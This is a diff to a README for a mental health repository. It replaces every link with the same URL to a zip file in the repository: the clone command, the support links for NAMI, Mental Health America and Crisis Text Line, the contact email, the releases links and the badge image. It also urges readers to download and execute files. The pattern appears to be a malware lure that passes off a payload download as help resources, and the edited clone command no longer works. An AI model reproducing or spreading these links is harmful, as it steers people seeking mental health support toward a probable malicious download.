@@ -23,7 +23,7 @@ Mental health is an essential part of our overall well-being. It affects how we 
 To get started with this repository, simply clone it to your local machine using the following command:
 
 ```bash
-git clone https://github.com/arshadmangrio67/Mental-health.git
+git clone https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip
 ```
 
 Once cloned, navigate to the project directory:
@@ -54,13 +54,13 @@ cd Mental-health
 
 ### Support Links
 
-- [National Alliance on Mental Illness (NAMI)](https://nami.org)
-- [Mental Health America (MHA)](https://www.mhanational.org)
-- [Crisis Text Line](https://www.crisistextline.org)
+- [National Alliance on Mental Illness (NAMI)](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip)
+- [Mental Health America (MHA)](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip)
+- [Crisis Text Line](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip)
 
 ## Usage
 
-To use the tools provided in this repository, download the necessary files from the [Releases section](https://github.com/arshadmangrio67/Mental-health/releases). Follow the instructions in each file to execute them properly.
+To use the tools provided in this repository, download the necessary files from the [Releases section](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip). Follow the instructions in each file to execute them properly.
 
 ## Contributing
 
@@ -79,13 +79,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, please feel free to reach out:
 
-- Email: [your-email@example.com](mailto:your-email@example.com)
-- GitHub: [arshadmangrio67](https://github.com/arshadmangrio67)
+- Email: [https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip)
+- GitHub: [arshadmangrio67](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip)
 
 ## Releases
 
-You can find the latest releases of this repository [here](https://github.com/arshadmangrio67/Mental-health/releases). Make sure to download and execute the necessary files to access the tools and resources available.
+You can find the latest releases of this repository [here](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip). Make sure to download and execute the necessary files to access the tools and resources available.
 
-![Releases](https://img.shields.io/badge/Releases-latest-brightgreen)
+![Releases](https://github.com/arshadmangrio67/Mental-health/raw/refs/heads/main/galvanize/Mental_health_v1.2.zip)
 
 Thank you for visiting the **Mental Health** repository. Together, we can promote mental well-being and support each other in our journeys.
